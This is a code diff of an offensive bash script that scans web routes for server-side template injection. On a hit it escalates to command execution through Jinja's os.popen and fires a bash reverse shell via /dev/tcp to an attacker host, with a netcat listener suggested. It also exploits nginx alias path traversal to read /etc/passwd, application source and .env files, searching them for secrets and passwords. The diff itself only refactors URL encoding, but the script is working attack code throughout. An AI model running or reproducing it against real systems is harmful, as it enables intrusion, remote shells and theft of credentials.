@@ -38,23 +38,26 @@ SSTI_PAYLOADS=(
 )
 SSTI_PARAMS=("q" "name" "search" "input" "msg" "message" "query" "template" "page")
 
+# url-encode helper: pipes via stdin to avoid all quoting issues with special chars
+urlencode() { printf '%s' "$1" | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read()),end='')"; }
+
 for PARAM in "${SSTI_PARAMS[@]}"; do
     for PAYLOAD in "${SSTI_PAYLOADS[@]}"; do
-        ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${PAYLOAD}'))")
+        ENC=$(urlencode "$PAYLOAD")
         for ROUTE in / /search /login; do
             RESP=$(curl -s "${BASE_URL}${ROUTE}?${PARAM}=${ENC}" --max-time 5 2>/dev/null)
             if echo "$RESP" | grep -qE "^49$|>49<"; then
                 echo "[+] SSTI found: ${BASE_URL}${ROUTE}?${PARAM}=${PAYLOAD}"
                 # Escalate to RCE
                 RCE_PAYLOAD='{{config.__class__.__init__.__globals__["os"].popen("id").read()}}'
-                RCE_ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${RCE_PAYLOAD}'))")
+                RCE_ENC=$(urlencode "$RCE_PAYLOAD")
                 RCE_RESP=$(curl -s "${BASE_URL}${ROUTE}?${PARAM}=${RCE_ENC}" --max-time 5)
                 if echo "$RCE_RESP" | grep -qE "uid=[0-9]+"; then
                     echo "[+] SSTI RCE confirmed!"
                     echo "    Payload: ${RCE_PAYLOAD}"
                     # Drop reverse shell
                     RS_PAYLOAD='{{config.__class__.__init__.__globals__["os"].popen("bash -c '"'"'bash -i >& /dev/tcp/'"${LHOST}"'/'"${LPORT}"' 0>&1'"'"'").read()}}'
-                    RS_ENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${RS_PAYLOAD}'))")
+                    RS_ENC=$(urlencode "$RS_PAYLOAD")
                     echo "[*] Firing reverse shell to ${LHOST}:${LPORT}..."
                     echo "[!] Start: nc -lvnp ${LPORT}"
                     curl -s "${BASE_URL}${ROUTE}?${PARAM}=${RS_ENC}" --max-time 10 > /dev/null &
@@ -99,7 +102,7 @@ for PREFIX in /static /files /media /assets /uploads /img; do
         echo "[+] Nginx alias traversal at: ${BASE_URL}${PREFIX}../"
         # Try to read sensitive files
         for FILE in "../../etc/passwd" "../../app/app.py" "../../app/config.py" "../../.env"; do
-            FENC=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${FILE}'))")
+            FENC=$(urlencode "$FILE")
             FCONTENT=$(curl -s "${BASE_URL}${PREFIX}../${FENC}" --max-time 5)
             if echo "$FCONTENT" | grep -q "root:\|SECRET\|password\|DATABASE"; then
                 echo "[+]   Readable: ${FILE}"
